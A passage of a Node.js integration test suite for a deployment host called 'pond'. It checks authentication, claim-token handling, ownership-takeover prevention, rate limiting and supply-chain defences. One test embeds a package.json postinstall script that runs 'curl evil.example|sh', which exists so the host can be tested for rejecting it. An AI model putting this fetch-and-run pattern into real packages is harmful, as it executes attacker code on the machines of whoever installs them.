import { test, before, after } from "node:test"
import assert from "node:assert/strict"
import { spawn } from "node:child_process"
import { mkdtempSync, rmSync, existsSync } from "node:fs"
import { tmpdir } from "node:os"
import * as path from "node:path"
import * as net from "node:net"
import { randomBytes } from "node:crypto"

import { stopProc } from "./proc-kill.mjs"

const REPO_ROOT = path.resolve(import.meta.dirname, "..")
const CLI_PATH = path.join(REPO_ROOT, "src", "cli.js")

async function pickFreePort() {
  return await new Promise((resolve, reject) => {
    const s = net.createServer()
    s.unref()
    s.on("error", reject)
    s.listen(0, "127.0.0.1", () => {
      const addr = s.address()
      const port = typeof addr === "object" && addr ? addr.port : 0
      s.close(() => resolve(port))
    })
  })
}

async function waitForHealth(apiUrl, timeoutMs = 8000) {
  const start = Date.now()
  while (Date.now() - start < timeoutMs) {
    try {
      const r = await fetch(`${apiUrl}/api/health`)
      if (r.ok) return
    } catch {
      // retry
    }
    await new Promise((r) => setTimeout(r, 100))
  }
  throw new Error(`host did not become healthy at ${apiUrl} within ${timeoutMs}ms`)
}

const TINY_SERVER_SRC = `import { capsule, mutation, query, string, table } from "pond/server"
export default capsule({
  schema: { items: table({ name: string() }) },
  queries: { items: query((ctx) => ctx.db.items.all()) },
  mutations: { add: mutation((ctx, name) => ctx.db.items.insert({ name })) },
})
`

function tinySourceFiles(serverSrc = TINY_SERVER_SRC, pkgJson) {
  return {
    "server/index.ts": serverSrc,
    "package.json": pkgJson ?? '{"name":"test-cap","private":true,"type":"module"}\n',
  }
}

let hostProc = null
let dataDir = null
let port = 0
let apiUrl = ""
let publicHost = "localhost"
const hostToken = randomBytes(16).toString("hex")
let adminToken = ""
let deployId = ""
let claimToken = ""

async function startHost() {
  port = await pickFreePort()
  apiUrl = `http://127.0.0.1:${port}`
  dataDir = mkdtempSync(path.join(tmpdir(), "pond-host-test-"))
  hostProc = spawn(
    process.execPath,
    [
      CLI_PATH,
      "host",
      "--port",
      String(port),
      "--host",
      "127.0.0.1",
      "--public-host",
      publicHost,
      "--data-dir",
      dataDir,
      "--anonymous-rate-per-hour",
      "100",
    ],
    {
      env: { ...process.env, POND_HOST_TOKEN: hostToken },
      stdio: ["ignore", "pipe", "pipe"],
      cwd: REPO_ROOT,
    },
  )
  hostProc.stdout.on("data", () => {})
  hostProc.stderr.on("data", () => {})
  await waitForHealth(apiUrl)
}

async function stopHost() {
  await stopProc(hostProc)
  hostProc = null
}

before(async () => {
  await startHost()
})

after(async () => {
  try {
    await stopHost()
  } finally {
    if (dataDir && existsSync(dataDir))
      rmSync(dataDir, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 })
  }
})

test("bootstrap creates admin via host token", async () => {
  const res = await fetch(`${apiUrl}/api/users`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${hostToken}` },
    body: JSON.stringify({ username: "admin" }),
  })
  assert.equal(res.status, 201)
  const body = await res.json()
  assert.equal(body.username, "admin")
  assert.equal(body.isAdmin, true)
  assert.ok(typeof body.token === "string" && body.token.length > 0)
  adminToken = body.token
})

test("deploy create with admin token succeeds and returns subdomain URL", async () => {
  const res = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ sourceFiles: tinySourceFiles() }),
  })
  assert.equal(res.status, 201)
  const body = await res.json()
  assert.match(body.url, new RegExp(`^http://[a-f0-9]+\\.${publicHost}:${port}$`))
  assert.ok(body.deployId.length >= 8)
  assert.ok(body.claimToken.length >= 32)
  assert.ok(typeof body.bundleHash === "string" && body.bundleHash.length === 64, "bundleHash returned")
  assert.ok(typeof body.bundleBytes === "number" && body.bundleBytes > 0, "bundleBytes returned")
  deployId = body.deployId
  claimToken = body.claimToken
})

test("GET /ide/:deployId bootstraps with lastBuild metadata persisted on the record", async () => {
  // Regression for the IDE diagnostics tile showing "No build yet" after a
  // page reload on an already-deployed project. The control plane must
  // surface bundleBytes / bundleHash / lastBuiltAt from the persisted
  // record in window.__POND_IDE so the IDE seeds its lastBuild state on
  // first mount instead of starting empty.
  // publicHost is "localhost" in this suite; we need to spoof Host header
  // because fetch() against 127.0.0.1 would not hit the bare-host branch.
  const http = await import("node:http")
  const result = await new Promise((resolve, reject) => {
    const req = http.request(
      {
        host: "127.0.0.1",
        port,
        method: "GET",
        path: `/ide/${deployId}`,
        headers: { host: `${publicHost}:${port}` },
      },
      (res) => {
        let data = ""
        res.on("data", (c) => (data += c))
        res.on("end", () => resolve({ status: res.statusCode, body: data }))
      },
    )
    req.on("error", reject)
    req.end()
  })
  assert.equal(result.status, 200)
  const m = result.body.match(/window\.__POND_IDE = (\{[^<]+?\})\s*<\/script>/)
  assert.ok(m, "bootstrap object missing from /ide html")
  const bootstrap = JSON.parse(m[1])
  assert.equal(bootstrap.deployId, deployId)
  assert.ok(bootstrap.lastBuild, "bootstrap.lastBuild should be populated after a fresh deploy create")
  assert.ok(typeof bootstrap.lastBuild.bundleBytes === "number" && bootstrap.lastBuild.bundleBytes > 0)
  assert.ok(typeof bootstrap.lastBuild.bundleHash === "string" && bootstrap.lastBuild.bundleHash.length === 64)
  assert.ok(typeof bootstrap.lastBuild.builtAt === "string" && bootstrap.lastBuild.builtAt.length > 0)
  assert.ok(typeof bootstrap.lastBuild.durationMs === "number" && bootstrap.lastBuild.durationMs >= 0)
})

test("subdomain Host header reaches the deploy via proxy", async () => {
  const http = await import("node:http")
  const result = await new Promise((resolve, reject) => {
    const req = http.request(
      {
        host: "127.0.0.1",
        port,
        method: "GET",
        path: "/api/query/items",
        headers: { host: `${deployId}.${publicHost}:${port}` },
      },
      (res) => {
        let data = ""
        res.on("data", (c) => (data += c))
        res.on("end", () => resolve({ status: res.statusCode, body: data }))
      },
    )
    req.on("error", reject)
    req.end()
  })
  assert.equal(result.status, 200)
  const body = JSON.parse(result.body)
  assert.ok(Array.isArray(body))
})

test("no subdomain → 404 from control plane", async () => {
  const res = await fetch(`${apiUrl}/api/query/items`)
  assert.equal(res.status, 404)
})

test("bare domain GET / serves landing page", async () => {
  // publicHost in this test suite is "localhost" — a request to 127.0.0.1
  // arrives with Host: 127.0.0.1:<port>, which is NOT the bare external host.
  // So we craft a request with Host: localhost:<port> to exercise the
  // landing-page branch.
  const http = await import("node:http")
  const result = await new Promise((resolve, reject) => {
    const req = http.request(
      {
        host: "127.0.0.1",
        port,
        method: "GET",
        path: "/",
        headers: { host: `${publicHost}:${port}` },
      },
      (res) => {
        let data = ""
        res.on("data", (c) => (data += c))
        res.on("end", () => resolve({ status: res.statusCode, body: data, ct: res.headers["content-type"] }))
      },
    )
    req.on("error", reject)
    req.end()
  })
  assert.equal(result.status, 200)
  assert.match(result.ct, /text\/html/)
  assert.match(result.body, /npm install -g pondsh/)
})

test("bare domain GET /abuse serves abuse policy", async () => {
  const http = await import("node:http")
  const result = await new Promise((resolve, reject) => {
    const req = http.request(
      {
        host: "127.0.0.1",
        port,
        method: "GET",
        path: "/abuse",
        headers: { host: `${publicHost}:${port}` },
      },
      (res) => {
        let data = ""
        res.on("data", (c) => (data += c))
        res.on("end", () => resolve({ status: res.statusCode, body: data }))
      },
    )
    req.on("error", reject)
    req.end()
  })
  assert.equal(result.status, 200)
  assert.match(result.body, /Abuse policy/)
})

test("bare domain GET /.well-known/security.txt serves a valid file", async () => {
  const http = await import("node:http")
  const result = await new Promise((resolve, reject) => {
    const req = http.request(
      {
        host: "127.0.0.1",
        port,
        method: "GET",
        path: "/.well-known/security.txt",
        headers: { host: `${publicHost}:${port}` },
      },
      (res) => {
        let data = ""
        res.on("data", (c) => (data += c))
        res.on("end", () => resolve({ status: res.statusCode, body: data, ct: res.headers["content-type"] }))
      },
    )
    req.on("error", reject)
    req.end()
  })
  assert.equal(result.status, 200)
  assert.match(result.ct, /text\/plain/)
  assert.match(result.body, /Contact:/)
  assert.match(result.body, /Expires:/)
})

test("persisted deploy record holds claimTokenHash, not plaintext claimToken (regression)", async () => {
  // MEDIUM-2 fix: the plaintext claim token is returned to the client at
  // create time (one-time disclosure) but the on-disk meta.json must hold
  // only the sha256 hash. A backup leak of the data dir should not yield
  // any usable claim tokens.
  const { readFileSync, existsSync, readdirSync } = await import("node:fs")
  const path = await import("node:path")
  // The deploy record is at <dataDir>/deploys/<deployId>/deploy.json
  const metaPath = path.join(dataDir, "deploys", deployId, "deploy.json")
  assert.ok(
    existsSync(metaPath),
    `deploy.json missing at ${metaPath} (dir has: ${readdirSync(path.join(dataDir, "deploys", deployId)).join(", ")})`,
  )
  const meta = JSON.parse(readFileSync(metaPath, "utf-8"))
  assert.equal(meta.claimToken, undefined, "plaintext claimToken should not be persisted")
  assert.ok(
    typeof meta.claimTokenHash === "string" && meta.claimTokenHash.length === 64,
    "claimTokenHash should be a sha256 hex",
  )

  const { createHash } = await import("node:crypto")
  const expected = createHash("sha256").update(claimToken).digest("hex")
  assert.equal(
    meta.claimTokenHash,
    expected,
    "stored hash should match sha256 of the plaintext token returned to client",
  )
})

test("POST /api/deploys with package.json containing lifecycle scripts is REJECTED (supply-chain)", async () => {
  // LOW-7 fix. Even though the host builds via esbuild and never runs
  // `npm install`, an uploaded package.json with a postinstall script becomes
  // a supply-chain weapon for anyone who later forks the deploy.
  const malicious = JSON.stringify({
    name: "evil",
    type: "module",
    scripts: { postinstall: "node -e \"require('child_process').execSync('curl evil.example|sh')\"" },
  })
  const res = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ sourceFiles: tinySourceFiles(undefined, malicious) }),
  })
  assert.equal(res.status, 400, `expected 400, got ${res.status}`)
  const body = await res.json()
  assert.match(body.error, /lifecycle script/i)
  assert.match(body.error, /postinstall/)
})

test("PUT /api/deploys/:id/files/package.json with lifecycle scripts is REJECTED", async () => {
  // Same rule, single-file IDE PUT path. Defense in depth.
  const malicious = JSON.stringify({
    name: "evil",
    type: "module",
    scripts: { preinstall: "echo pwned" },
  })
  const res = await fetch(`${apiUrl}/api/deploys/${deployId}/files/package.json`, {
    method: "PUT",
    headers: { "content-type": "text/plain", authorization: `Bearer ${adminToken}` },
    body: malicious,
  })
  assert.equal(res.status, 400, `expected 400, got ${res.status}`)
  const body = await res.json()
  assert.match(body.error, /lifecycle script/i)
  assert.match(body.error, /preinstall/)
})

test("isPublic detection ignores `public: true` inside comments and string literals", async () => {
  // LOW-1 fix. Pre-0.3.11, the regex scanned raw source, so a docstring or
  // commented-out example marked the deploy as public — exposing source via
  // /gallery and /api/public-deploys/:id/source.
  const innocuous = `import { capsule, mutation, query, string, table } from "pond/server"
// Example from the docs: \`capsule({ public: true, ... })\` makes a deploy public.
// This deploy is NOT public — the string "public: true" only appears in this comment.
const NOTE = "see the docs example: public: true"
export default capsule({
  title: "Private Box",
  description: "Owner-only",
  schema: { items: table({ name: string() }) },
  queries: { items: query((ctx) => ctx.db.items.all()) },
  mutations: { add: mutation((ctx, name) => ctx.db.items.insert({ name })) },
})
`
  const create = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ sourceFiles: tinySourceFiles(innocuous) }),
  })
  assert.equal(create.status, 201)
  const cb = await create.json()

  const list = await fetch(`${apiUrl}/api/public-deploys`)
  const lb = await list.json()
  const found = lb.deploys.find((d) => d.deployId === cb.deployId)
  assert.equal(found, undefined, "deploy with `public: true` only in comments must NOT appear in public listing")

  // And the source fetch should 404 too.
  const src = await fetch(`${apiUrl}/api/public-deploys/${cb.deployId}/source`)
  assert.equal(src.status, 404, "source endpoint must 404 for non-public deploys")
})

test("isPublic detection ignores `public: true` in real code outside the capsule() call", async () => {
  // The scan is confined to the capsule({ … }) argument object. A genuine
  // `public: true` elsewhere (an unrelated config object, here) is real code —
  // string/comment stripping would NOT blank it — so only arg-scoping prevents
  // it from silently flipping the deploy public and exposing its source.
  const innocuous = `import { capsule, mutation, query, string, table } from "pond/server"
const featureFlags = { public: true, beta: false }
export const flags = featureFlags
export default capsule({
  title: "Private Box",
  description: "Owner-only",
  schema: { items: table({ name: string() }) },
  queries: { items: query((ctx) => ctx.db.items.all()) },
  mutations: { add: mutation((ctx, name) => ctx.db.items.insert({ name })) },
})
`
  const create = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ sourceFiles: tinySourceFiles(innocuous) }),
  })
  assert.equal(create.status, 201)
  const cb = await create.json()

  const list = await fetch(`${apiUrl}/api/public-deploys`)
  const lb = await list.json()
  const found = lb.deploys.find((d) => d.deployId === cb.deployId)
  assert.equal(found, undefined, "deploy with `public: true` only outside the capsule() call must NOT be public")

  const src = await fetch(`${apiUrl}/api/public-deploys/${cb.deployId}/source`)
  assert.equal(src.status, 404, "source endpoint must 404 when public: true is outside capsule()")
})

test("isPublic detection still flags `public: true` inside the capsule() call", async () => {
  const realPublic = `import { capsule, mutation, query, string, table } from "pond/server"
export default capsule({
  public: true,
  title: "Shared Box",
  description: "Public",
  schema: { items: table({ name: string() }) },
  queries: { items: query((ctx) => ctx.db.items.all()) },
  mutations: { add: mutation((ctx, name) => ctx.db.items.insert({ name })) },
})
`
  const create = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ sourceFiles: tinySourceFiles(realPublic) }),
  })
  assert.equal(create.status, 201)
  const cb = await create.json()

  const list = await fetch(`${apiUrl}/api/public-deploys`)
  const lb = await list.json()
  const found = lb.deploys.find((d) => d.deployId === cb.deployId)
  assert.ok(found, "deploy with `public: true` inside capsule() must be public")
  assert.equal(found.title, "Shared Box")
})

test("re-claim of an already-owned deploy by a different user with a stolen claim token is REJECTED", async () => {
  // Regression for the 0.3.8 takeover bug: anyone who possessed a deploy's
  // claim token (which is stored plaintext on disk and was previously in the
  // browser's localStorage) could POST /api/deploys/<id>/claim with their own
  // bearer token and silently transfer ownership away from the current owner.
  // After the fix, the cross-owner transfer must return 403.
  //
  // Setup: the deploy created in the test above is owned by `admin`. Create
  // a second non-admin user and try to re-claim it with the admin's claim
  // token + the new user's bearer.
  const attackerSignup = await fetch(`${apiUrl}/api/users`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${hostToken}` },
    body: JSON.stringify({ username: "attacker" }),
  })
  assert.equal(attackerSignup.status, 201)
  const { token: attackerToken } = await attackerSignup.json()

  const res = await fetch(`${apiUrl}/api/deploys/${deployId}/claim`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${attackerToken}` },
    body: JSON.stringify({ claimToken }),
  })
  assert.equal(res.status, 403, `expected 403, got ${res.status}: ${await res.text()}`)
})

test("re-claim by the same owner with their own bearer is allowed (cross-machine login)", async () => {
  // The fix above must NOT break the legitimate "I'm reattaching from a new
  // machine as the existing owner" flow — admin owns the deploy, so this
  // should succeed.
  const res = await fetch(`${apiUrl}/api/deploys/${deployId}/claim`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ claimToken }),
  })
  assert.equal(res.status, 200, `expected 200, got ${res.status}: ${await res.text()}`)
})

test("wrong user token → 401 on POST /api/deploys", async () => {
  const res = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: "Bearer not-a-real-token" },
    body: JSON.stringify({ sourceFiles: tinySourceFiles() }),
  })
  assert.equal(res.status, 401)
})

test("wrong claim token → 403 on PUT /api/deploys/:id (no auth)", async () => {
  const res = await fetch(`${apiUrl}/api/deploys/${deployId}`, {
    method: "PUT",
    headers: {
      "content-type": "application/json",
      "x-pond-claim-token": "deadbeef".repeat(8),
    },
    body: JSON.stringify({ sourceFiles: tinySourceFiles() }),
  })
  // bad claim token + no Bearer => 401 (auth required); both cases acceptable per spec
  assert.ok(res.status === 401 || res.status === 403, `expected 401/403, got ${res.status}`)
})

test("body > 64 MB returns 413", async () => {
  // Make a base64 payload that decodes to > 64 MB.
  // We avoid building a huge buffer in JS — just send a Content-Length header
  // larger than the limit via a streaming body of zeros.
  const oversize = 65 * 1024 * 1024
  const chunk = Buffer.alloc(1024 * 1024, 0x41) // 1 MB of 'A'
  let sent = 0
  const stream = new ReadableStream({
    pull(controller) {
      if (sent >= oversize) {
        controller.close()
        return
      }
      controller.enqueue(chunk)
      sent += chunk.length
    },
  })
  const res = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: {
      "content-type": "application/json",
      authorization: `Bearer ${adminToken}`,
      "content-length": String(oversize),
    },
    body: stream,
    duplex: "half",
  })
  assert.equal(res.status, 413)
})

test("failed anonymous boot cleans up dir + DB rows (regression)", async () => {
  const fs = await import("node:fs")
  // Source compiles fine but throws synchronously when imported — exercises the
  // post-build boot-failure cleanup path. Use an extra host for a fresh rate window.
  const h = await startExtraHost()
  try {
    const before = fs.readdirSync(path.join(h.dataDir, "deploys")).length
    const res = await fetch(`${h.apiUrl}/api/deploys`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        sourceFiles: tinySourceFiles(`throw new Error("boom on import")\nexport default {}\n`),
      }),
    })
    assert.equal(res.status, 500)
    const after = fs.readdirSync(path.join(h.dataDir, "deploys")).length
    assert.equal(after, before, "deploy dir leaked after boot failure")
  } finally {
    await stopExtraHost(h)
  }
})

async function startExtraHost({ extraArgs = [], env = {} } = {}) {
  const xPort = await pickFreePort()
  const xUrl = `http://127.0.0.1:${xPort}`
  const xData = mkdtempSync(path.join(tmpdir(), "pond-host-test-extra-"))
  const xToken = randomBytes(16).toString("hex")
  const proc = spawn(
    process.execPath,
    [
      CLI_PATH,
      "host",
      "--port",
      String(xPort),
      "--host",
      "127.0.0.1",
      "--public-host",
      publicHost,
      "--data-dir",
      xData,
      ...extraArgs,
    ],
    {
      env: { ...process.env, POND_HOST_TOKEN: xToken, ...env },
      stdio: ["ignore", "pipe", "pipe"],
      cwd: REPO_ROOT,
    },
  )
  proc.stdout.on("data", () => {})
  proc.stderr.on("data", () => {})
  await waitForHealth(xUrl)
  return { proc, port: xPort, apiUrl: xUrl, dataDir: xData, hostToken: xToken }
}

async function stopExtraHost(h) {
  await stopProc(h.proc)
  if (h.dataDir && existsSync(h.dataDir))
    rmSync(h.dataDir, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 })
}

let anonDeployId = ""
let anonClaimToken = ""

test("anonymous POST /api/deploys succeeds and returns terminatesAt + expiresAt", async () => {
  const res = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ sourceFiles: tinySourceFiles() }),
  })
  assert.equal(res.status, 201)
  const body = await res.json()
  assert.ok(body.deployId)
  assert.ok(body.claimToken)
  assert.ok(typeof body.terminatesAt === "string", `terminatesAt missing: ${JSON.stringify(body)}`)
  assert.ok(typeof body.expiresAt === "string", `expiresAt missing: ${JSON.stringify(body)}`)
  anonDeployId = body.deployId
  anonClaimToken = body.claimToken
})

test("source tree exceeding limit returns 400", async () => {
  // 5 MB of content in a single shared/ file — over the 4 MB source-tree cap.
  const huge = "x".repeat(5 * 1024 * 1024)
  const res = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      sourceFiles: { ...tinySourceFiles(), "shared/big.txt": huge },
    }),
  })
  assert.equal(res.status, 400)
})

test("anonymous PUT /api/deploys/:id returns 403", async () => {
  const res = await fetch(`${apiUrl}/api/deploys/${anonDeployId}`, {
    method: "PUT",
    headers: {
      "content-type": "application/json",
      "x-pond-claim-token": anonClaimToken,
    },
    body: JSON.stringify({ sourceFiles: tinySourceFiles() }),
  })
  assert.equal(res.status, 403)
})

test("anonymous PUT /env returns 403", async () => {
  const res = await fetch(`${apiUrl}/api/deploys/${anonDeployId}/env`, {
    method: "PUT",
    headers: {
      "content-type": "application/json",
      authorization: `Bearer ${adminToken}`,
    },
    body: JSON.stringify({ entries: { FOO: "bar" } }),
  })
  assert.equal(res.status, 403)
})

test("POST /api/admin/deploys/:id/terminate without host token returns 401", async () => {
  const res = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ sourceFiles: tinySourceFiles() }),
  })
  assert.equal(res.status, 201)
  const { deployId: id } = await res.json()
  const noauth = await fetch(`${apiUrl}/api/admin/deploys/${id}/terminate`, { method: "POST" })
  assert.equal(noauth.status, 401)
})

test("POST /api/admin/deploys/:id/terminate with a non-host user token returns 403", async () => {
  const signup = await fetch(`${apiUrl}/api/users`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${hostToken}` },
    body: JSON.stringify({ username: `term-snooper-${randomBytes(4).toString("hex")}` }),
  })
  assert.equal(signup.status, 201)
  const { token: snoopToken } = await signup.json()
  const res = await fetch(`${apiUrl}/api/admin/deploys/${deployId}/terminate`, {
    method: "POST",
    headers: { authorization: `Bearer ${snoopToken}` },
  })
  assert.equal(res.status, 403)
})

test("POST /api/admin/deploys/:id/terminate with the host token terminates an anonymous deploy", async () => {
  const create = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ sourceFiles: tinySourceFiles() }),
  })
  assert.equal(create.status, 201)
  const { deployId: id } = await create.json()
  const res = await fetch(`${apiUrl}/api/admin/deploys/${id}/terminate`, {
    method: "POST",
    headers: { authorization: `Bearer ${hostToken}` },
  })
  assert.equal(res.status, 200)
  const body = await res.json()
  assert.equal(body.terminated, true)
  assert.equal(body.anonymous, true)
  // A terminated anonymous deploy shows terminated:true in the deploys listing.
  const list = await fetch(`${apiUrl}/api/deploys`, {
    headers: { authorization: `Bearer ${adminToken}` },
  })
  const listed = (await list.json()).deploys.find((d) => d.deployId === id)
  assert.equal(listed.terminated, true)
})

test("POST /api/admin/deploys/:id/terminate on a missing deploy returns 404", async () => {
  const res = await fetch(`${apiUrl}/api/admin/deploys/deadbeefdeadbeef/terminate`, {
    method: "POST",
    headers: { authorization: `Bearer ${hostToken}` },
  })
  assert.equal(res.status, 404)
})

test("Turnstile not configured: anonymous deploy needs no token (off-safe default)", async () => {
  const res = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ sourceFiles: tinySourceFiles() }),
  })
  assert.equal(res.status, 201)
})

test("Turnstile configured: anonymous deploy without a token is rejected with 403", async () => {
  const h = await startExtraHost({ env: { POND_TURNSTILE_SECRET: "test-secret" } })
  try {
    const res = await fetch(`${h.apiUrl}/api/deploys`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ sourceFiles: tinySourceFiles() }),
    })
    assert.equal(res.status, 403)
    const body = await res.json()
    assert.match(body.error, /Turnstile/)
  } finally {
    await stopExtraHost(h)
  }
})

test("Turnstile configured: authenticated deploy is never challenged", async () => {
  const h = await startExtraHost({ env: { POND_TURNSTILE_SECRET: "test-secret" } })
  try {
    const bootstrap = await fetch(`${h.apiUrl}/api/users`, {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${h.hostToken}` },
      body: JSON.stringify({ username: "admin" }),
    })
    assert.equal(bootstrap.status, 201)
    const { token } = await bootstrap.json()
    const res = await fetch(`${h.apiUrl}/api/deploys`, {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${token}` },
      body: JSON.stringify({ sourceFiles: tinySourceFiles() }),
    })
    assert.equal(res.status, 201)
  } finally {
    await stopExtraHost(h)
  }
})

test("GET /api/deploys/:id/logs returns last N entries with owner bearer", async () => {
  const res = await fetch(`${apiUrl}/api/deploys/${deployId}/logs?limit=5`, {
    headers: { authorization: `Bearer ${adminToken}` },
  })
  assert.equal(res.status, 200)
  const body = await res.json()
  assert.ok(Array.isArray(body.entries), `entries should be an array, got: ${JSON.stringify(body)}`)
  assert.ok(body.entries.length <= 5, `limit should be respected, got ${body.entries.length}`)
})

test("GET /api/deploys/:id/logs without auth returns 401", async () => {
  const res = await fetch(`${apiUrl}/api/deploys/${deployId}/logs`)
  assert.equal(res.status, 401)
})

test("GET /api/deploys/:id/logs as a non-owner returns 403", async () => {
  const signup = await fetch(`${apiUrl}/api/users`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${hostToken}` },
    body: JSON.stringify({ username: `log-snooper-${randomBytes(4).toString("hex")}` }),
  })
  assert.equal(signup.status, 201)
  const { token: snoopToken } = await signup.json()
  const res = await fetch(`${apiUrl}/api/deploys/${deployId}/logs`, {
    headers: { authorization: `Bearer ${snoopToken}` },
  })
  assert.equal(res.status, 403)
})

test("GET /api/deploys/:id/logs on an anonymous (unclaimed) deploy returns 403", async () => {
  const res = await fetch(`${apiUrl}/api/deploys/${anonDeployId}/logs`, {
    headers: { authorization: `Bearer ${adminToken}` },
  })
  assert.equal(res.status, 403)
})

test("GET /api/deploys/:id/logs caps limit at 500", async () => {
  const res = await fetch(`${apiUrl}/api/deploys/${deployId}/logs?limit=99999`, {
    headers: { authorization: `Bearer ${adminToken}` },
  })
  assert.equal(res.status, 200)
  const body = await res.json()
  assert.ok(Array.isArray(body.entries))
  assert.ok(body.entries.length <= 500, `cap should be 500, got ${body.entries.length}`)
})

test("claim with --signup creates user and transfers ownership", async () => {
  // Deploy anonymously, then claim with signup.
  const create = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ sourceFiles: tinySourceFiles() }),
  })
  assert.equal(create.status, 201)
  const cb = await create.json()

  const claim = await fetch(`${apiUrl}/api/deploys/${cb.deployId}/claim`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ claimToken: cb.claimToken, signup: { username: "alice" } }),
  })
  assert.equal(claim.status, 200)
  const claimed = await claim.json()
  assert.ok(claimed.user, "claim response missing user credential")
  assert.equal(claimed.user.username, "alice")
  assert.ok(claimed.user.token.length >= 32)

  // alice should now see this deploy in GET /api/deploys
  const list = await fetch(`${apiUrl}/api/deploys`, {
    headers: { authorization: `Bearer ${claimed.user.token}` },
  })
  assert.equal(list.status, 200)
  const lb = await list.json()
  const found = lb.deploys.find((d) => d.deployId === cb.deployId)
  assert.ok(found, "alice should see her claimed deploy")
  assert.equal(found.anonymous, false)
})

test("claim with existing user token transfers ownership", async () => {
  const fs = await import("node:fs")
  const sourceFiles = tinySourceFiles()
  const create = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ sourceFiles }),
  })
  assert.equal(create.status, 201)
  const cb = await create.json()

  const claim = await fetch(`${apiUrl}/api/deploys/${cb.deployId}/claim`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ claimToken: cb.claimToken }),
  })
  assert.equal(claim.status, 200)
  const claimed = await claim.json()
  assert.equal(claimed.user, undefined, "no new user should be created")

  const list = await fetch(`${apiUrl}/api/deploys`, {
    headers: { authorization: `Bearer ${adminToken}` },
  })
  const lb = await list.json()
  const found = lb.deploys.find((d) => d.deployId === cb.deployId)
  assert.ok(found)
  assert.equal(found.anonymous, false)
})

test("GET /api/deploys exposes title/description parsed from capsule()", async () => {
  const titled = `import { capsule, mutation, query, string, table } from "pond/server"
export default capsule({
  title: "Guestbook",
  description: "Public feed where everyone can sign their name.",
  schema: { items: table({ name: string() }) },
  queries: { items: query((ctx) => ctx.db.items.all()) },
  mutations: { add: mutation((ctx, name) => ctx.db.items.insert({ name })) },
})
`
  const create = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ sourceFiles: tinySourceFiles(titled) }),
  })
  assert.equal(create.status, 201)
  const cb = await create.json()

  const list = await fetch(`${apiUrl}/api/deploys`, {
    headers: { authorization: `Bearer ${adminToken}` },
  })
  assert.equal(list.status, 200)
  const lb = await list.json()
  const found = lb.deploys.find((d) => d.deployId === cb.deployId)
  assert.ok(found, "newly-deployed titled project should appear in /api/deploys")
  assert.equal(found.title, "Guestbook")
  assert.equal(found.description, "Public feed where everyone can sign their name.")
  assert.equal(found.isPublic, false)
})

test("anonymous rate limit: 6th request from same IP in an hour returns 429", async () => {
  const h = await startExtraHost({ extraArgs: ["--anonymous-rate-per-hour", "5"] })
  try {
    const fs = await import("node:fs")
    const sourceFiles = tinySourceFiles()
    const statuses = []
    for (let i = 0; i < 6; i++) {
      const res = await fetch(`${h.apiUrl}/api/deploys`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ sourceFiles }),
      })
      statuses.push(res.status)
      // drain body
      await res.text().catch(() => "")
    }
    const successes = statuses.filter((s) => s === 201).length
    const limited = statuses.filter((s) => s === 429).length
    assert.equal(successes, 5, `statuses=${statuses.join(",")}`)
    assert.equal(limited, 1, `statuses=${statuses.join(",")}`)
  } finally {
    await stopExtraHost(h)
  }
})

test("anonymous rate limit survives host restart (persisted in control DB)", async () => {
  // Start a host with rate=3, burn 3 attempts, bounce the host, confirm the
  // 4th attempt from the same IP still returns 429 after restart.
  const xData = mkdtempSync(path.join(tmpdir(), "pond-host-rate-persist-"))
  const xPort = await pickFreePort()
  const xUrl = `http://127.0.0.1:${xPort}`
  const xToken = randomBytes(16).toString("hex")
  function spawnHost() {
    return spawn(
      process.execPath,
      [
        CLI_PATH,
        "host",
        "--port",
        String(xPort),
        "--host",
        "127.0.0.1",
        "--public-host",
        publicHost,
        "--data-dir",
        xData,
        "--anonymous-rate-per-hour",
        "3",
      ],
      {
